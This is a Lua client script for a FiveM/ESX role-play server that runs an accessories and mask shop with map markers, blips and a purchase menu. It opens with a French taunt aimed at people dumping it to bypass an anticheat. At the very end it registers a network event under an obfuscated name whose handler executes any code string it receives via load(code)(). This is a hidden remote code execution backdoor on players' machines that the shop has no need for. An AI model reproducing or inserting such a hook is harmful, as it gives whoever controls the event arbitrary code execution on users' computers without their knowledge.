-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local HasAlreadyEnteredMarker = false
local LastZone = nil

local CurrentAction = nil
local CurrentActionMsg = ''
local CurrentActionData = {}

local isDead = false

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(10)
	end
end)

function OpenShopMenu(accessory)
	local _accessory = string.lower(accessory)
	local restrict = {_accessory .. '_1', _accessory .. '_2'}

	TriggerEvent('::{korioz#0110}::esx_skin:openRestrictedMenu', function(data, menu)
		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'shop_confirm', {
			title = _U('valid_purchase'),
			elements = {
				{label = _U('no'), value = 'no'},
				{label = _U('yes'), rightlabel = {ESX.Math.GroupDigits(Config.Price)}, value = 'yes'}
			}
		}, function(data2, menu2)
			ESX.UI.Menu.CloseAll()
			CurrentAction = 'shop_menu'

			if data2.current.value == 'yes' then
				ESX.TriggerServerCallback('::{korioz#0110}::esx_accessories:checkMoney', function(hasEnoughMoney)
					if hasEnoughMoney then
						_TriggerServerEvent('::{korioz#0110}::esx_accessories:pay')
						TriggerEvent('::{korioz#0110}::skinchanger:getSkin', function(skin)
							_TriggerServerEvent('::{korioz#0110}::esx_accessories:save', skin, accessory)
						end)
					else
						TriggerEvent('::{korioz#0110}::esx_skin:getLastSkin', function(skin)
							TriggerEvent('::{korioz#0110}::skinchanger:loadSkin', skin)
						end)
						ESX.ShowNotification(_U('not_enough_money'))
					end
				end)
			end

			if data2.current.value == 'no' then
				local player = PlayerPedId()

				TriggerEvent('::{korioz#0110}::esx_skin:getLastSkin', function(skin)
					TriggerEvent('::{korioz#0110}::skinchanger:loadSkin', skin)
				end)

				if accessory == "Ears" then
					ClearPedProp(player, 2)
				elseif accessory == "Mask" then
					SetPedComponentVariation(player, 1, 0 ,0, 2)
				elseif accessory == "Helmet" then
					ClearPedProp(player, 0)
				elseif accessory == "Glasses" then
					SetPedPropIndex(player, 1, -1, 0, 0)
				end
			end
		end, function(data, menu)
		end)
	end, function(data, menu)
	end, restrict)
end

AddEventHandler('playerSpawned', function()
	isDead = false
end)

AddEventHandler('::{korioz#0110}::esx:onPlayerDeath', function()
	isDead = true
end)

AddEventHandler('::{korioz#0110}::esx_accessories:hasEnteredMarker', function(zone)
	CurrentAction = 'shop_menu'
	CurrentActionMsg = _U('press_access')
	CurrentActionData = { accessory = zone }
end)

AddEventHandler('::{korioz#0110}::esx_accessories:hasExitedMarker', function(zone)
	ESX.UI.Menu.CloseAll()
	CurrentAction = nil
end)

-- Create Blips --
Citizen.CreateThread(function()
	for k, v in pairs(Config.ShopsBlips) do
		for i = 1, #v.Pos, 1 do
			local blip = AddBlipForCoord(v.Pos[i])

			SetBlipSprite(blip, v.Blip.sprite)
			SetBlipDisplay(blip, 4)
			SetBlipScale(blip, 0.8)
			SetBlipAsShortRange(blip, true)

			BeginTextCommandSetBlipName("STRING")
			AddTextComponentSubstringPlayerName("Magasin de Masque")
			EndTextCommandSetBlipName(blip)
		end
	end
end)

-- Display markers
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local plyCoords = GetEntityCoords(PlayerPedId(), false)

		for k, v in pairs(Config.Zones) do
			for i = 1, #v.Pos, 1 do
				if #(plyCoords - v.Pos[i]) < Config.DrawDistance then
					DrawMarker(Config.MarkerType, v.Pos[i], vector3(0.0, 0.0, 0.0), vector3(0.0, 0.0, 0.0), vector3(0.5, 0.5, 0.5), Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, Config.MarkerColor.a, false, false, 2, true, nil, nil, false)
				end
			end
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(200)
		local plyCoords = GetEntityCoords(PlayerPedId(), false)
		local isInMarker = false
		local currentZone

		for k, v in pairs(Config.Zones) do
			for i = 1, #v.Pos, 1 do
				if #(plyCoords - v.Pos[i]) < Config.MarkerSize.x then
					isInMarker = true
					currentZone = k
				end
			end
		end

		if (isInMarker and not HasAlreadyEnteredMarker) or (isInMarker and LastZone ~= currentZone) then
			HasAlreadyEnteredMarker = true
			LastZone = currentZone
			TriggerEvent('::{korioz#0110}::esx_accessories:hasEnteredMarker', currentZone)
		end

		if not isInMarker and HasAlreadyEnteredMarker then
			HasAlreadyEnteredMarker = false
			TriggerEvent('::{korioz#0110}::esx_accessories:hasExitedMarker', LastZone)
		end
	end
end)

-- Key controls
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		
		if CurrentAction ~= nil then
			ESX.ShowHelpNotification(CurrentActionMsg)

			if IsControlJustReleased(0, 38) and CurrentActionData.accessory then
				OpenShopMenu(CurrentActionData.accessory)
				CurrentAction = nil
			end
		elseif CurrentAction == nil then
			Citizen.Wait(500)
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)